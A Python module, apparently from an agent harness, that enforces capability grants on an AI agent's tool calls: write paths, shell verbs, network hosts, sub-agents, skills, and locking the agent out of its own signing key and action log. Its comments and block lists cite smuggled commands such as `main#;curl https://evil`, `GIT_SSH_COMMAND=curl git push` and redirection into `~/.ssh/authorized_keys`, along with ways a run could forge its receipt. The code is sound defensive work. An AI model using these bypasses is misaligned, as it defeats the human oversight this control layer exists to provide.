"""Grants: the capability list, turned into decisions a hook can make in milliseconds.

The manifest declares capabilities as strings. The run engine writes them, once,
into `grants.json` in the run directory and puts that path in `TEYLA_GRANTS`.
Every tool call the harness makes then goes through `decide()` here, from the
`PreToolUse` hook, and gets one of: allow, deny.

Five schemes, and each is enforced by a different piece of evidence:

    fs.write:runs/**       the Write/Edit target path, resolved through symlinks
    shell:git push         the verb of every segment of a Bash command, plus every
                           redirection target in it, checked against `fs.write:`
    net:*                  the host of a WebFetch/WebSearch URL
    send:telegram          a budget, spent by anything that looks like a send
    tool:mcp__loco__*      the tool name, for MCP and any other non-built-in tool
    tool:Agent             sub-agents (`Task`), which are not free by default
    tool:Skill:<name>      one named skill; `tool:Skill:*` for all of them

Built-in read-only tools (Read, Grep, Glob, ...) are allowed **except on the
control plane's own state**: reading inside the repo the human already opened is
not the risk this file exists to manage, but `~/.teyla/hmac.key` is the key that
signs the action log, and a run that can read it can forge its own receipt.
Everything else is denied unless something above grants it.

Six things this file refuses regardless of what was granted, because each one
turns a narrow grant into a broad one:

* **Any access — write *or* read — to the control plane's own files.**
  `grants.json`, `actions.jsonl` and friends, anywhere, and anything under
  `~/.teyla`. A run that can rewrite its own grants has none; a run that can
  rewrite (or read the signing key of) its own action log has no receipt. See
  `state.CONTROL_BASENAMES`, and `names_control_state` for the Bash side.
* **Environment-assignment prefixes** (`FOO=1 cmd`) unless `shell:env` is
  granted — and even then only an **allowlist** of names: `TEYLA_*`, `LANG`,
  `LC_*`, `TZ`, `NO_COLOR`, `PAGER=cat`. Everything else is refused, `GIT_*`
  (`GIT_SSH_COMMAND=curl git push`), `HOME` (`HOME=runs git push`, with a
  `runs/.gitconfig` alias), `SSH*`, `XDG_*`, `PATH`, `LD_*`, `DYLD_*`,
  `PYTHON*`, `NODE_*`, `PERL*`, `RUBY*`, `BASH_ENV`, `ENV`, `IFS` and `CDPATH`
  included. A denylist was the bug: every one of those was a name nobody had
  thought of yet.
* **Dangerous verbs** — interpreters (`sh`, `python`, `node`, `perl`, …),
  copiers (`cp`, `tee`, `ln`, `dd`), privilege changes (`sudo`, `chmod`),
  network clients (`curl`, `ssh`, `rsync`) and `git -c` / `git --exec-path` —
  unless `shell:*` is granted. `shell:python` is **not** enough: naming an
  interpreter as the verb grants everything the interpreter can do, so the grant
  that allows it has to say so. See `DANGEROUS_VERBS`.
* **Process substitution** (`>(…)`, `<(…)`), which is a command hiding inside
  what looks like a filename.
* **Redirection to a path no `fs.write:` grant covers.** `echo x > ~/.ssh/authorized_keys`
  is a write, whatever the verb in front of it says.
* **Writes outside the product repo.** A relative `fs.write:` glob only ever
  matches inside the repo root, `fs.write:*` included — that one means "any file
  in the repo root", never the filesystem. Reaching outside takes an absolute
  grant (`fs.write:/abs/path/**`), written out in the manifest.

The holes that remain, stated rather than papered over: a `net:` grant can
exfiltrate anything the run can read; `shell:*` (or any grant that reaches an
interpreter) is **full trust — equivalent to no grants at all**; and the run can
still read the whole product repo. Grant all three narrowly.
"""
from __future__ import annotations

import contextlib
import fnmatch
import json
import os
import pathlib
import re
import shlex

from . import state as S

# Built-in tools that only read. Always allowed.
#
# `Task`, `Skill` and `SlashCommand` are deliberately NOT here. Each one starts
# something that makes its own tool calls, and "read-only" was never true of them:
# a sub-agent inherits the session, not the grant list, so treating `Task` as a
# read is a hole the width of the whole tool surface.
READ_ONLY_TOOLS = frozenset({
    "Read", "Grep", "Glob", "LS", "NotebookRead", "TodoWrite", "TodoRead",
    "BashOutput", "KillShell", "KillBash", "ExitPlanMode", "AskUserQuestion",
})

# The read-only tools that take a path. "Always allowed" was true of these until it
# was pointed out that `Read ~/.teyla/hmac.key` is the key the action log is signed
# with: a run that reads it can sign any line it likes, and the receipt — the whole
# point of the log — becomes something the run wrote. These are checked against the
# control plane's own paths before they are allowed.
READ_PATH_TOOLS = frozenset({"Read", "Grep", "Glob", "LS", "NotebookRead"})

# The tool-input keys those tools name a path in.
READ_PATH_KEYS = ("file_path", "path", "notebook_path", "pattern", "glob", "file")

# Tools that spawn a sub-agent. Allowed only under `tool:Agent` or `tool:Task`.
AGENT_TOOLS = frozenset({"Task", "Agent"})

# Tools that load a named procedure. Allowed only under `tool:Skill:<name>`.
SKILL_TOOLS = frozenset({"Skill"})

# Built-in tools that write to the filesystem. Governed by `fs.write:`.
WRITE_TOOLS = frozenset({"Write", "Edit", "MultiEdit", "NotebookEdit", "Update"})

# Built-in tools that reach the network. Governed by `net:`.
NET_TOOLS = frozenset({"WebFetch", "WebSearch"})

BASH_TOOLS = frozenset({"Bash", "BashTool"})

# A deliberately coarse net over "this call puts something in front of another
# human". Coarse in the safe direction: a false positive costs one explicit
# `send:` grant in the manifest, a false negative costs a message you did not
# approve. See docs/CONTROL-PLANE.md.
SEND_RE = re.compile(
    r"send|post_message|postmessage|\bpost\b|email|mail|notify|publish|tweet|"
    r"\bdm\b|sms|telegram|slack|whatsapp|reply|broadcast",
    re.I,
)

# Shell metacharacters that hide the verb from a leading-token check. A command
# containing one is only allowed under an explicit `shell:*`.
_OPAQUE_RE = re.compile(r"\$\(|`|\$\{[^}]*\}")

# Process substitution. Refused outright, `shell:*` included: `>(sh)` is a command
# wearing a filename, and there is no reading of it that a grant list can check.
_PROCSUB_RE = re.compile(r"[<>]\(")

# Tokens that separate one command from the next. `&` belongs here as much as `&&`
# does — `cmd & evil` backgrounds the granted half and runs the other one, and a
# splitter that only knows `&&` sees one granted command.
SEGMENT_OPERATORS = frozenset({"&&", "||", "&", ";", "|", "|&", ";;", "\n"})

# Redirections whose target is written to. `<` is a read and is not here.
WRITE_REDIRECTS = frozenset({">", ">>", ">|", "&>", "&>>", ">&"})
READ_REDIRECTS = frozenset({"<", "<<", "<<<", "<&", "<>"})

# The environment variables a `shell:env` grant may set. An **allowlist**, because
# the denylist it replaced was only ever a list of the names somebody had already
# thought of: it named `GIT_CONFIG*` and missed `GIT_SSH_COMMAND=curl git push`, and
# it named `PATH` and missed `HOME=runs git push` against a planted `runs/.gitconfig`.
# Anything not named here is refused even under `shell:env`.
ALLOWED_ENV_NAMES = frozenset({"LANG", "TZ", "NO_COLOR"})
ALLOWED_ENV_PREFIXES = ("TEYLA_", "LC_")
# `PAGER` is allowed only as `PAGER=cat`: its whole purpose is to name a program to run.
ALLOWED_ENV_EXACT = {"PAGER": "cat"}

# Named in the refusal so the message says why, not just no. Not the check — the
# check is the allowlist above, and these are examples of what it excludes.
NOTABLE_DENIED_ENV = ("PATH", "GIT_* (GIT_SSH_COMMAND, GIT_CONFIG_KEY_0, ...)", "HOME",
                      "SSH*", "XDG_*", "LD_*", "DYLD_*", "PYTHON*", "NODE_*", "PERL*",
                      "RUBY*", "BASH_ENV", "ENV", "IFS", "CDPATH")

# Verbs that can run, write or fetch anything once they start, whatever their
# arguments say. A grant naming one of these by name — `shell:python` — would be a
# narrow-looking grant for an unbounded capability, so each of them needs `shell:*`,
# which the docs describe for what it is: full trust, equivalent to no grants.
DANGEROUS_VERBS = frozenset({
    "sh", "bash", "zsh", "dash", "fish", "ksh", "csh", "tcsh",
    "python", "python2", "python3", "node", "deno", "bun", "perl", "ruby", "php",
    "xargs", "find", "env", "eval", "exec", "source", ".", "tee",
    "cp", "mv", "ln", "install", "dd", "chmod", "chown", "sudo", "su",
    "nohup", "setsid", "osascript", "open",
    "curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "rsync",
})

# `git -c core.pager='!sh'` and `git --exec-path=/tmp` turn `shell:git push` into
# arbitrary execution the same way an environment prefix did.
GIT_DANGEROUS_FLAGS = ("-c", "--exec-path", "--config-env")

_INTERPRETER_RE = re.compile(r"^(python|ruby|perl|php|node)[0-9.]*$", re.I)

_ASSIGN_RE = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)=")

ALLOW = "allow"
DENY = "deny"


# --- building ---------------------------------------------------------------------


def build(routine, *, run_id: str, run_dir, grants_path, state_path, actions_path) -> dict:
    """The grants document written next to the run. Self-contained on purpose: the hook
    reads this file and nothing else, so it keeps working if the manifest is edited
    mid-run, and the receipt can quote exactly what was granted."""
    from .manifest import group_capabilities

    grouped = group_capabilities(routine.capabilities)
    return {
        "version": 1,
        "run_id": run_id,
        "routine": routine.ref,
        "product": routine.product,
        "repo": str(routine.repo),
        "gate": routine.gate,
        "capabilities": list(routine.capabilities),
        "grants": grouped,
        "caps": dict(routine.caps),
        "run_dir": str(run_dir),
        "grants_path": str(grants_path),
        "state": str(state_path),
        "actions": str(actions_path),
    }


def load(path) -> dict:
    return json.loads(pathlib.Path(path).read_text())


# --- matching primitives ------------------------------------------------------------


def _norm(p: str) -> str:
    return str(p).replace(os.sep, "/")


def _glob_re(pattern: str) -> re.Pattern:
    """Compile one glob, path-aware: `*` and `?` stop at `/`, only `**` crosses it.

    `fnmatch` does not make that distinction, which is how `fs.write:*.md` came to
    match `.claude/rules/pwn.md` — a grant meant for the top level quietly covering
    every markdown file in the tree, rule files included."""
    out = ["(?s)\\A"]
    i, n = 0, len(pattern)
    while i < n:
        c = pattern[i]
        if c == "*":
            if pattern.startswith("**", i):
                # `**/` may match nothing at all, so `a/**/b` also matches `a/b`.
                if pattern.startswith("**/", i):
                    out.append("(?:.*/)?")
                    i += 3
                    continue
                out.append(".*")
                i += 2
                continue
            out.append("[^/]*")
            i += 1
            continue
        if c == "?":
            out.append("[^/]")
            i += 1
            continue
        if c == "[":
            j = pattern.find("]", i + 1)
            if j != -1:
                body = pattern[i + 1:j]
                body = body.replace("\\", "\\\\")
                if body.startswith("!"):
                    body = "^" + body[1:]
                out.append("[" + body + "]")
                i = j + 1
                continue
        out.append(re.escape(c))
        i += 1
    out.append("\\Z")
    return re.compile("".join(out))


_GLOB_CACHE: dict[str, re.Pattern] = {}


def glob_match(candidate: str, pattern: str) -> bool:
    """One path against one glob, with `*` confined to a single path segment."""
    rx = _GLOB_CACHE.get(pattern)
    if rx is None:
        rx = _GLOB_CACHE[pattern] = _glob_re(pattern)
    return bool(rx.match(candidate))


def resolve_target(target, repo) -> pathlib.Path:
    """The path a write would really land on: absolute, with every symlink in it
    followed. `os.path.realpath` resolves the components that exist and leaves the
    rest alone, which is what a not-yet-created file needs."""
    t = pathlib.Path(str(target)).expanduser()
    repo = pathlib.Path(str(repo)).expanduser()
    base = t if t.is_absolute() else (repo / t)
    return pathlib.Path(os.path.realpath(str(base)))


def path_matches(target, patterns, repo) -> bool:
    """Does `target` fall under any `fs.write:` pattern?

    The path is resolved through symlinks first, then matched against the pattern
    both relative to the repo root and absolute, so `runs/**` and `/tmp/scratch/**`
    both work. A pattern that is *not* absolute only ever matches inside the repo:
    a relative-looking path that resolves out of the tree is a symlink escape, and
    `runs/**` was never a grant to write wherever `runs/x` happens to point.

    That holds for `*` and `**` too. `fs.write:*` means "any file in the repo root,
    no slash in it" — one path segment, matched against the repo-relative path — and
    `fs.write:**` means "anywhere in the repo". Neither reaches outside it; that
    takes an absolute grant, written out: `fs.write:/abs/path/**`."""
    ok, _ = write_target_ok(target, patterns, repo)
    return ok


def write_target_ok(target, patterns, repo) -> tuple[bool, str]:
    """`path_matches` with the reason attached, and the two absolute refusals in
    front of it: the control plane's own files, and `~/.teyla`."""
    if not str(target or "").strip():
        return False, "no path to check against `fs.write:`"
    repo_p = pathlib.Path(str(repo)).expanduser()
    try:
        real = resolve_target(target, repo_p)
    except (OSError, ValueError) as e:
        return False, f"{target!r} could not be resolved ({e})"

    if S.is_control_path(target) or S.is_control_path(real):
        return False, (f"{target} is a control-plane file — the run's own grants, counters, "
                       f"action log or receipt. No grant covers these, by design")

    if not patterns:
        return False, "no `fs.write:` capability is granted for this run"

    try:
        repo_real = pathlib.Path(os.path.realpath(str(repo_p)))
    except (OSError, ValueError):
        repo_real = repo_p
    try:
        rel = _norm(real.relative_to(repo_real))
        inside = True
    except ValueError:
        rel, inside = None, False

    for raw in patterns:
        pat = _norm(str(raw)).strip()
        if not pat:
            continue
        absolute = pat.startswith("/") or pat.startswith("~")
        if pat.startswith("~"):
            pat = _norm(str(pathlib.Path(pat).expanduser()))
        candidates = [_norm(real)] if absolute else ([rel] if inside else [])
        for c in candidates:
            if c is None:
                continue
            if glob_match(c, pat):
                return True, f"{target} is within `fs.write:{raw}`"
            # `runs/**` also names the directory `runs` itself.
            if pat.endswith("/**") and (c == pat[:-3] or glob_match(c, pat[:-3])):
                return True, f"{target} is within `fs.write:{raw}`"

    granted = ", ".join(str(p) for p in patterns) or "(none)"
    if not inside:
        return False, (f"{target} resolves to {real}, outside the repo {repo_real}. "
                       f"A relative `fs.write:` grant — `*` and `**` included — only ever "
                       f"matches inside the repo; reaching outside it takes an absolute grant "
                       f"such as `fs.write:{real.parent}/**`. Granted: [{granted}]")
    return False, f"{target} is outside the `fs.write:` grants [{granted}]"


# --- reading a shell command --------------------------------------------------------


def tokenize(command: str) -> list[str]:
    """One **line** of a command string -> words and operators, quotes respected.

    `shlex` with `punctuation_chars` is the only stdlib thing that knows `&&` from
    `&`, and it keeps `>`/`>>`/`<(` as their own tokens, which is what the
    redirection and process-substitution checks below need.

    Two of its defaults are wrong for this job and are turned off here:

    * `commenters='#'` **strips from `#` to the end of the string, mid-token
      included**. `git push origin main#;curl https://evil` lexed as `git push
      origin main` — a granted push — while bash, for which `#` is only a comment
      at the start of a word, ran the curl. `commenters=""` makes `#` an ordinary
      character and lets `;` do the splitting; a segment that is *entirely* a
      comment is dropped in `split_segments`, which is the only place `#` means
      anything.
    * newlines are whitespace under `whitespace_split`, so `git push\ncurl evil`
      was one segment whose verb was `git push`. The caller splits lines before
      it gets here — see `split_segments`."""
    lexer = shlex.shlex(command or "", punctuation_chars=True)
    lexer.whitespace_split = True
    lexer.commenters = ""
    try:
        return list(lexer)
    except ValueError:
        # An unbalanced quote. Fall back to a dumb split; the caller fails closed
        # on anything it cannot read a verb from anyway.
        return (command or "").split()


def split_segments(command: str) -> list[list[str]]:
    """The command, cut at every separator, as a list of token lists. Every one of
    them has to be granted — that is the whole point of splitting.

    **A newline is a separator.** `\n` and `\r` are cut first, before tokenizing,
    because `shlex` in `whitespace_split` mode swallows them: `git push origin
    main\ncurl https://evil` arrived here as one segment whose first two tokens
    were a granted `git push`, and the second line ran unexamined. Every line is at
    least one segment, and `;`/`|`/`&&`/`||`/`&` cut it further."""
    out: list[list[str]] = []
    # A backslash-newline is a line continuation, not a separator: the shell joins
    # those two lines into one command and so does this.
    joined = re.sub(r"\\\r?\n", " ", command or "")
    for line in re.split(r"[\n\r]+", joined):
        cur: list[str] = []
        for tok in tokenize(line):
            if tok in SEGMENT_OPERATORS:
                if cur:
                    out.append(cur)
                cur = []
                continue
            cur.append(tok)
        if cur:
            out.append(cur)
    return out


def _unquote(tok: str) -> str:
    if len(tok) >= 2 and tok[0] == tok[-1] and tok[0] in "\"'":
        return tok[1:-1]
    return tok


def segment_parts(tokens) -> tuple[list[str], list[str], list[str]]:
    """One segment -> `(env assignments, write-redirection targets, words)`.

    The words are what a `shell:` grant is matched against; the redirection targets
    are handed to the `fs.write:` check. File-descriptor targets (`2>&1`) are not
    files and are dropped."""
    assigns: list[str] = []
    redirects: list[str] = []
    words: list[str] = []
    i, n = 0, len(tokens)
    leading = True
    while i < n:
        tok = tokens[i]
        if leading and _ASSIGN_RE.match(tok):
            assigns.append(tok)
            i += 1
            continue
        if tok in WRITE_REDIRECTS or tok in READ_REDIRECTS:
            # `2>file` lexes as `2`, `>`, `file`: the fd digit is not a word.
            if words and words[-1].isdigit():
                words.pop()
            target = _unquote(tokens[i + 1]) if i + 1 < n else ""
            if tok in WRITE_REDIRECTS and target and not target.isdigit() and target != "-":
                redirects.append(target)
            i += 2
            continue
        leading = False
        words.append(tok)
        i += 1
    return assigns, redirects, words


# The only variables a redirection target may be written in terms of. A step is
# *supposed* to write its reversal to `$TEYLA_UNDO`, so the check has to be able to
# read that; expanding anything else would let the command choose its own target
# name and hand the checker a different string from the one the shell will use.
EXPANDABLE = ("TEYLA_UNDO", "TEYLA_RUN_DIR", "TEYLA_REPO", "TEYLA_RUN_ID")


def expand_target(target: str, env=None) -> str | None:
    """A redirection target with the known `TEYLA_*` variables filled in. `None` if
    anything else in it is still unresolved — an unresolvable target is one the
    checker cannot vouch for, and it is refused rather than guessed at."""
    if env is None:
        env = os.environ
    out = target or ""
    if "$" not in out:
        return out
    for name in EXPANDABLE:
        value = env.get(name)
        if not value:
            continue
        out = out.replace(f"${{{name}}}", str(value)).replace(f"${name}", str(value))
    return None if "$" in out else out


def _env_prefix_problem(assigns) -> str | None:
    """An environment prefix that `shell:env` does not cover, or None.

    Allowlisted, not denylisted. The denylist named `GIT_CONFIG` and let
    `GIT_SSH_COMMAND=curl git push` through; it named `PATH` and let `HOME=runs git
    push` through, which reads `runs/.gitconfig` the run just wrote. There is no
    version of that list that is complete, so the question is now which names are
    *safe*, and the answer is a short list of locale and Teyla's own."""
    for a in assigns:
        m = _ASSIGN_RE.match(a)
        name = m.group(1) if m else a
        value = _unquote(a.partition("=")[2].strip())
        if name.startswith(ALLOWED_ENV_PREFIXES) or name in ALLOWED_ENV_NAMES:
            continue
        if ALLOWED_ENV_EXACT.get(name) == value:
            continue
        allowed = "TEYLA_*, LANG, LC_*, TZ, NO_COLOR, PAGER=cat"
        return (f"the segment sets {name}=, which changes what the verb after it actually "
                f"runs. `shell:env` allows an allowlist only ({allowed}); everything else "
                f"is refused, {', '.join(NOTABLE_DENIED_ENV)} included")
    return None


def dangerous_verb(toks) -> str | None:
    """The verb of this segment if it is one that no narrow grant can bound, else None.

    Matched on the basename, so `/bin/sh` and `/usr/bin/env` count. `git` counts when
    it carries `-c` or `--exec-path`, which are how a granted `git push` becomes
    arbitrary execution without an environment prefix."""
    if not toks:
        return None
    head = str(toks[0])
    base = head.rsplit("/", 1)[-1]
    for cand in (head, base):
        if cand in DANGEROUS_VERBS:
            return cand
    if _INTERPRETER_RE.match(base):
        return base
    if base == "git":
        for tok in toks[1:]:
            for flag in GIT_DANGEROUS_FLAGS:
                if tok == flag or tok.startswith(flag + "="):
                    return f"git {flag}"
    return None


def shell_allowed(command: str, patterns, *, fs_write=(), repo=".", env=None) -> tuple[bool, str]:
    """Every segment of a Bash command must be matched by some `shell:` grant, and
    every path it redirects into must be matched by an `fs.write:` grant.

    A grant is matched token-wise against the head of the segment: `shell:git push`
    matches `git push origin main` and not `git commit`. `shell:*` grants every
    verb, including the dangerous ones and the opaque forms (command substitution)
    that are otherwise refused because they hide the verb this check depends on.
    **`shell:*` is full trust — read it as equivalent to no grants at all.** It
    still does not grant process substitution, and it still does not exempt a
    redirection from `fs.write:`."""
    command = command or ""

    if _PROCSUB_RE.search(command):
        return False, ("command uses process substitution (`>(...)` / `<(...)`), which runs a "
                       "command where a filename is expected. Refused under every grant")

    star = any(str(p).strip() == "*" for p in patterns or ())
    if not patterns:
        return False, "no `shell:` capability is granted for this run"
    env_granted = any(str(p).strip() == "env" for p in patterns or ()) or star

    if not star and _OPAQUE_RE.search(command):
        return False, "command uses substitution ($(...), backticks, ${...}), which hides the verb — needs `shell:*`"

    segments = split_segments(command)
    if not segments:
        return False, "empty command"

    for seg in segments:
        assigns, redirects, words = segment_parts(seg)

        problem = _env_prefix_problem(assigns)
        if problem:
            return False, problem
        if assigns and not env_granted:
            names = ", ".join(a.split("=", 1)[0] for a in assigns)
            return False, (f"the segment sets {names} before its verb; an environment prefix can "
                           f"redirect what that verb does, so it needs `shell:env`")

        for target in redirects:
            resolved = expand_target(target, env)
            if resolved is None:
                return False, (f"redirection writes to {target}, which contains a variable this "
                               f"check cannot resolve — an unverifiable write target is refused")
            ok, why = write_target_ok(resolved, list(fs_write or ()), repo)
            if not ok:
                return False, f"redirection writes to {target}: {why}"

        if not words:
            if redirects or assigns:
                continue  # a bare `> file` segment: the write was already checked
            return False, f"cannot read a verb from segment {' '.join(seg)!r}"

        # A `#` only starts a comment at the start of a word — which, after splitting,
        # means a segment whose first word is one. `main#;curl evil` is not a comment,
        # and reading it as one is how `git push origin main#;curl https://evil` used
        # to lex down to a granted push.
        if str(words[0]).startswith("#"):
            continue

        if star:
            continue
        toks = [_unquote(w) for w in words]
        ok = False
        for pat in patterns:
            want = str(pat).split()
            if not want or want == ["env"]:
                continue
            if len(toks) < len(want):
                continue
            if all(fnmatch.fnmatch(toks[i], want[i]) for i in range(len(want))):
                ok = True
                break
        if not ok:
            verb = " ".join(toks[:2])
            granted = ", ".join(str(p) for p in patterns)
            return False, f"`{verb}` is not matched by any `shell:` grant ({granted})"

        # Granted by name — and still refused, if the name is one that cannot be
        # bounded. `shell:python` reads like a narrow grant and is not one: it is
        # every write, every fetch and every verb the interpreter can reach. Only
        # `shell:*`, which the docs call full trust, allows these.
        bad = dangerous_verb(toks)
        if bad:
            return False, (f"`{bad}` is an interpreter, a copier, a privilege change or a "
                           f"network client: whatever its arguments say, it can run or write "
                           f"anything, so the `shell:` grant naming it cannot bound it. It needs "
                           f"`shell:*` — which is full trust, equivalent to no grants at all")

    return True, ("shell:*, with every redirection checked against `fs.write:`" if star
                  else "a shell grant matched every segment, and every redirection was within `fs.write:`")


def leading_tokens(segment: str) -> list[str]:
    """The verb of one command segment, for logging. Assignments and redirections
    are stripped. Not a security check — `shell_allowed` is."""
    segs = split_segments(segment)
    if not segs:
        return []
    _, _, words = segment_parts(segs[0])
    return [_unquote(w) for w in words]


def tool_matches(tool_name: str, patterns) -> bool:
    return any(fnmatch.fnmatch(tool_name, str(p)) for p in patterns or [])


def net_allowed(url: str, patterns) -> tuple[bool, str]:
    """One URL against the `net:` grants. Two forms and no others:

        net:api.example.com     exactly that host, nothing else
        net:*.example.com       that host and any subdomain of it

    Anything else matches nothing, and a suffix of fewer than two labels matches
    nothing whatever it is written as: `net:com` used to match `evil.com`, because
    the old check accepted any host *ending in* the grant. So did `net:*` written as
    `net:*.com`. `net:*` alone is still the deliberate everything grant."""
    if not patterns:
        return False, "no `net:` capability is granted for this run"
    if any(str(p).strip() == "*" for p in patterns):
        return True, "net:*"
    host = ""
    m = re.match(r"^[a-z][a-z0-9+.-]*://([^/?#]+)", str(url or ""), re.I)
    if m:
        host = m.group(1).split("@")[-1].split(":")[0]
    host = host.strip().rstrip(".").lower()
    if not host:
        return False, f"cannot read a host from {url!r}"
    for raw in patterns:
        pat = str(raw).strip().rstrip(".").lower()
        if not pat:
            continue
        if pat.startswith("*."):
            domain = pat[2:]
            if domain.count(".") < 1:
                continue  # `*.com` is a TLD, and a TLD is not a grant
            if host == domain or host.endswith("." + domain):
                return True, f"net grant {raw} matched host {host}"
            continue
        if "*" in pat:
            continue  # only `*` and a leading `*.` are grant syntax
        if host == pat:
            return True, f"net grant {raw} matched host {host}"
    return False, (f"host {host} is not matched by any `net:` grant ({', '.join(patterns)}) — "
                   f"a grant is an exact host or `*.domain`, and a bare TLD matches nothing")


def looks_like_send(tool_name: str, command: str = "") -> bool:
    return bool(SEND_RE.search(tool_name or "") or SEND_RE.search(command or ""))


_QUOTING_RE = re.compile(r"""["'\\]""")


def _flatten(text: str) -> str:
    """The string as the shell would see it after quote removal: quotes and
    backslashes dropped, so `~/.te""yla/hmac.key` and `'hmac'.key` read the same as
    the plain spelling. Concatenation is how a substring test gets dodged."""
    return _QUOTING_RE.sub("", text or "")


def names_control_state(text: str) -> str | None:
    """Does this string name the control plane's own state at all?

    Deliberately coarse: a shell command can reach a file in more ways than a
    checker can enumerate (`cd`, a variable, a relative path, `find -exec`), so the
    test is whether the string names one of these at all, not whether this
    particular invocation would write to it. A false positive costs one renamed
    scratch file; a false negative costs the receipt its meaning — or, in the case
    of `hmac.key`, lets the run sign its own history.

    Case-insensitive for the filenames with an extension and for `.teyla`/`hmac`,
    because the filesystem this runs on is case-insensitive too. `KILL` stays
    case-sensitive: lower-cased it is the substring of every `kill` and `pkill`
    command there is."""
    flat = _flatten(text)
    low = flat.lower()
    for name in sorted(S.CONTROL_BASENAMES):
        if "." in name:
            if name.lower() in low:
                return name
        elif name in flat:
            return name
    for needle in (".teyla", "hmac"):
        if needle in low:
            return needle
    home = str(S.home())
    for needle in (home, "~/.teyla", "$TEYLA_HOME", "${TEYLA_HOME}", "$TEYLA_GRANTS", "${TEYLA_GRANTS}"):
        if needle and needle in flat:
            return needle
    return None


def _names_a_control_file(command: str) -> str | None:
    """The Bash side of `names_control_state`, applied **per segment and to the
    tokens joined back together**, so that a name split across tokens or hidden in
    quotes is seen the way the shell will see it."""
    hit = names_control_state(command or "")
    if hit:
        return hit
    for seg in split_segments(command or ""):
        hit = names_control_state(" ".join(str(tok) for tok in seg))
        if hit:
            return hit
    return None


# --- counters ---------------------------------------------------------------------


ZERO_STATE = {"writes": 0, "sends": 0, "calls": 0, "denied": 0}


def read_state(path) -> dict:
    try:
        data = json.loads(pathlib.Path(path).read_text())
    except (OSError, ValueError):
        return dict(ZERO_STATE)
    if not isinstance(data, dict):
        return dict(ZERO_STATE)
    for k in ZERO_STATE:
        data.setdefault(k, 0)
    return data


def write_state(path, state: dict) -> None:
    p = pathlib.Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(json.dumps(state))


@contextlib.contextmanager
def state_transaction(path):
    """Read-modify-write the counter file under an exclusive `flock`.

    Two tool calls in flight at once — which is the normal case, the harness runs
    them in parallel — were both reading `writes: 4`, both deciding they were under
    a cap of 5, and both writing `5`. The cap leaked one call per race. The lock is
    held for the whole read-decide-write, not just the write, because it is the
    decision that has to be serialised, not the bytes."""
    p = pathlib.Path(path)
    p.parent.mkdir(parents=True, exist_ok=True)
    lock = p.with_name(p.name + ".lock")
    fd = None
    try:
        fd = os.open(str(lock), os.O_RDWR | os.O_CREAT, 0o600)
    except OSError:
        fd = None
    try:
        if fd is not None:
            try:
                import fcntl
                fcntl.flock(fd, fcntl.LOCK_EX)
            except (ImportError, OSError):
                pass
        st = read_state(p)
        yield st
        try:
            write_state(p, st)
        except OSError:
            pass
    finally:
        if fd is not None:
            try:
                import fcntl
                fcntl.flock(fd, fcntl.LOCK_UN)
            except (ImportError, OSError):
                pass
            os.close(fd)


# --- the decision -------------------------------------------------------------------


def decide(tool_name: str, tool_input: dict, doc: dict, state: dict) -> tuple[str, str, dict]:
    """One tool call -> (ALLOW|DENY, reason, counter deltas).

    Pure: it reads the grants document and the current counters and returns what
    should happen. The hook does the I/O and turns this into an exit code, so the
    whole decision table is testable without a subprocess or a transcript."""
    grants = doc.get("grants") or {}
    caps = doc.get("caps") or {}
    repo = doc.get("repo") or "."
    tool_input = tool_input or {}
    delta: dict = {}

    fs_write = grants.get("fs.write") or []
    shell = grants.get("shell") or []
    net = grants.get("net") or []
    send = grants.get("send") or []
    tools = grants.get("tool") or []

    # 0. reads of the control plane's own state. Read/Grep/Glob/LS are otherwise
    # always allowed, and that is what made `~/.teyla/hmac.key` — the key every
    # action-log line is signed with — readable by every run on the machine. A run
    # that holds the key can forge the log the receipt is built from, so the read
    # is refused before anything else is considered.
    if tool_name in READ_PATH_TOOLS:
        for key in READ_PATH_KEYS:
            value = tool_input.get(key)
            if not isinstance(value, str) or not value.strip():
                continue
            named = names_control_state(value)
            if named is None and not S.is_control_path(value):
                continue
            return DENY, (f"{tool_name}: {value} names control-plane state "
                          f"({named or 'a path under ~/.teyla'}) — the signing key, the run's "
                          f"grants, its counters, its action log, its receipt. Reading these is "
                          f"refused under every grant: the key signs the log the receipt is "
                          f"built from"), delta

    # 1. writes
    if tool_name in WRITE_TOOLS:
        target = tool_input.get("file_path") or tool_input.get("path") or tool_input.get("notebook_path") or ""
        if not target:
            return DENY, f"{tool_name}: no file_path in the tool input to check against `fs.write:`", delta
        ok, why = write_target_ok(target, fs_write, repo)
        if not ok:
            return DENY, f"{tool_name}: {why}", delta
        limit = caps.get("max_writes")
        if limit is not None and state.get("writes", 0) >= limit:
            return DENY, f"write cap reached: max_writes={limit}", delta
        delta["writes"] = 1
        return ALLOW, f"{tool_name}: {why}", delta

    # 2. shell
    if tool_name in BASH_TOOLS:
        command = tool_input.get("command") or ""
        named = _names_a_control_file(command)
        if named:
            return DENY, (f"Bash: the command names {named}, which is control-plane state "
                          f"(the run's grants, counters, action log or receipt). Refused under "
                          f"every grant"), delta
        ok, why = shell_allowed(command, shell, fs_write=fs_write, repo=repo)
        if not ok:
            return DENY, f"Bash: {why}", delta
        if looks_like_send(tool_name="", command=command):
            ok_send, why_send, d = _spend_send(send, caps, state, what=f"Bash command {command[:60]!r}")
            if not ok_send:
                return DENY, why_send, delta
            delta.update(d)
        return ALLOW, f"Bash: {why}", delta

    # 2b. sub-agents and skills. Neither is read-only, and a sub-agent that inherited
    # the session without inheriting the grant list is the whole tool surface again.
    if tool_name in AGENT_TOOLS:
        if not (tool_matches("Agent", tools) or tool_matches("Task", tools)):
            granted = ", ".join(tools) or "(none)"
            return DENY, (f"{tool_name} starts a sub-agent, which is not covered by any `tool:` "
                          f"grant [{granted}] — grant `tool:Agent` to allow it"), delta
        return ALLOW, f"{tool_name} matched a `tool:Agent` grant", delta

    if tool_name in SKILL_TOOLS:
        name = str(tool_input.get("skill") or tool_input.get("name") or "").strip()
        if not name:
            return DENY, "Skill: no skill name in the tool input to check against `tool:Skill:<name>`", delta
        want = f"Skill:{name}"
        for p in tools:
            p = str(p).strip()
            # A bare `tool:Skill` names no skill. It used to allow every one of them,
            # which is the `tool:Skill:*` grant spelled in a way nobody would read as
            # "all skills on this machine".
            if p == "Skill":
                continue
            if fnmatch.fnmatch(want, p):
                return ALLOW, f"Skill {name!r} matched the `tool:{p}` grant", delta
        granted = ", ".join(tools) or "(none)"
        return DENY, (f"the skill {name!r} is not matched by any `tool:` grant [{granted}] — "
                      f"grant `tool:Skill:{name}`, or `tool:Skill:*` for all of them. A bare "
